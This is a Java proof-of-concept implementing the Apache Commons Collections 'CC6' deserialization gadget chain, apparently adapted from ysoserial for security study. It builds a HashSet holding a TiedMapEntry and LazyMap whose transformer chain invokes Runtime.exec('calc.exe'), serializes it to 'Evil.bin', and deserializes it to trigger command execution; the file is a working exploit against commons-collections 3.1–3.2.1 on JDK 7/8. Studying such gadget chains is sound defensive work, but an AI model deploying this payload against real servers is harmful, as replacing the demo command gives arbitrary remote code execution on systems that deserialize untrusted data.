package com.CommonsCollections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;


/**
 * Gadget chain:
 * java.io.ObjectInputStream.readObject()
 *        java.util.HashSet.readObject()
 *            java.util.HashMap.put()
 *            java.util.HashMap.hash()
 *                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
 *                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
 *                    org.apache.commons.collections.map.LazyMap.get()
 *                        org.apache.commons.collections.functors.ChainedTransformer.transform()
 *                        org.apache.commons.collections.functors.InvokerTransformer.transform()
 *                        java.lang.reflect.Method.invoke()
 *                            java.lang.Runtime.exec()
 *
 * 	Requires:
 * 		commons-collections:3.1-3.2.1
 * 	    JDK: 1.7 & 1.8
 *
 * 	Refer：
 * 	https://github.com/woodpecker-framework/ysoserial-for-woodpecker/blob/master/src/main/java/me/gv7/woodpecker/yso/payloads/CommonsCollections6.java
 */


public class CC6 {
    public static void main(String[] args) throws Exception {
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})});
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
        TiedMapEntry tiedmap = new TiedMapEntry(map,123);

        HashSet hashset = new HashSet(1);
        hashset.add("foo");
        HashMap hashset_map = (HashMap) getFieldValue(hashset, "map");
        Object[] array = (Object[]) getFieldValue(hashset_map, "table");

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node, tiedmap);

        //payload序列化写入文件
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("Evil.bin"));
        outputStream.writeObject(hashset);
        outputStream.close();
        //服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("Evil.bin"));
        inputStream.readObject();
    }

    public static Object getFieldValue(Object object, String fieldName) throws Exception{
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(object);
    }
}
